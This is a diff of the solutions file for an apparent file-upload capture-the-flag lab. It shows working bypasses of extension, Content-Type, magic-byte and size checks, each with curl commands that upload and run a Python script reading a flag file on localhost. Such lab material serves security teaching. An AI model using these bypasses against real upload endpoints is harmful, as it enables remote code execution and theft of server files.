@@ -2,53 +2,39 @@
   NeonGallery — File Upload Lab Solutions (Port 5010)
 ===============================================================================
 
-CHALLENGE 1: No Validation — Unrestricted Upload
-Flag: FLAG{upl04d_unr3str1ct3d}
-
-  The /upload endpoint accepts any file without validation.
-  Upload a Python script and execute it via /run.
-
-  echo 'print(open("/app/flag.txt").read())' > /tmp/exploit.py
-
-  curl -F "file=@/tmp/exploit.py" http://localhost:5010/upload
-
-  curl "http://localhost:5010/run?file=exploit.py&ch=1"
-
--------------------------------------------------------------------------------
-
-CHALLENGE 2: Extension Blacklist Bypass
+CHALLENGE 1: Extension Blacklist Bypass
 Flag: FLAG{upl04d_3xt_byp4ss}
 
-  The /upload-filtered endpoint blocks .py, .sh, .php, .jsp, .exe, .bat.
+  The /upload endpoint blocks .py, .sh, .php, .jsp, .exe, .bat.
   But the check is case-sensitive and doesn't block .py3, .Py, or .PY.
 
-  echo 'print(open("/app/flag2.txt").read())' > /tmp/exploit.py3
+  echo 'print(open("/app/flag.txt").read())' > /tmp/exploit.py3
 
-  curl -F "file=@/tmp/exploit.py3" http://localhost:5010/upload-filtered
+  curl -F "file=@/tmp/exploit.py3" http://localhost:5010/upload
 
-  curl "http://localhost:5010/run?file=exploit.py3&ch=2"
+  curl "http://localhost:5010/run?file=exploit.py3&ch=1"
 
   NOTE: .PY and .Py do NOT work — the code uses ext.lower() before
   checking the blocklist. Only .py3 bypasses the filter.
 
 -------------------------------------------------------------------------------
 
-CHALLENGE 3: Content-Type Bypass
+CHALLENGE 2: Content-Type Bypass
 Flag: FLAG{upl04d_ct_byp4ss}
 
   The /upload-ct endpoint checks that Content-Type starts with "image/".
   But Content-Type is client-controlled — just set it in the request.
 
-  echo 'print(open("/app/flag3.txt").read())' > /tmp/exploit.py
+  echo 'print(open("/app/flag2.txt").read())' > /tmp/exploit.py
 
   curl -F "file=@/tmp/exploit.py;type=image/png" \
     http://localhost:5010/upload-ct
 
-  curl "http://localhost:5010/run?file=exploit.py&ch=3"
+  curl "http://localhost:5010/run?file=exploit.py&ch=2"
 
 -------------------------------------------------------------------------------
 
-CHALLENGE 4: Magic Bytes Bypass
+CHALLENGE 3: Magic Bytes Bypass
 Flag: FLAG{upl04d_m4g1c_byt3s}
 
   The /upload-magic endpoint checks the first 4 bytes for image magic
@@ -59,12 +45,12 @@ Flag: FLAG{upl04d_m4g1c_byt3s}
   with open('/tmp/exploit_magic.py', 'wb') as f:
       # Use JPEG magic bytes (all non-printable, so regex strips them cleanly)
       f.write(b'\xff\xd8\xff\xe0')
-      f.write(b'\nprint(open(\"/app/flag4.txt\").read())\n')
+      f.write(b'\nprint(open(\"/app/flag3.txt\").read())\n')
   "
 
   curl -F "file=@/tmp/exploit_magic.py" http://localhost:5010/upload-magic
 
-  curl "http://localhost:5010/run?file=exploit_magic.py&ch=4"
+  curl "http://localhost:5010/run?file=exploit_magic.py&ch=3"
 
   NOTE: Don't use PNG magic (\x89PNG) — the letters P, N, G are printable
   ASCII and survive the stripping regex, causing a NameError when Python
@@ -73,17 +59,17 @@ Flag: FLAG{upl04d_m4g1c_byt3s}
 
 -------------------------------------------------------------------------------
 
-CHALLENGE 5: Size Limit Bypass
+CHALLENGE 4: Size Limit Bypass
 Flag: FLAG{upl04d_s1z3_l1m1t}
 
   The /upload-size endpoint rejects files larger than 100 bytes.
   A minimal Python one-liner fits easily:
 
-  echo -n 'print(open("/app/flag5.txt").read())' > /tmp/tiny.py
+  echo -n 'print(open("/app/flag4.txt").read())' > /tmp/tiny.py
   # This is only ~37 bytes
 
   curl -F "file=@/tmp/tiny.py" http://localhost:5010/upload-size
 
-  curl "http://localhost:5010/run?file=tiny.py&ch=5"
+  curl "http://localhost:5010/run?file=tiny.py&ch=4"
 
 ===============================================================================
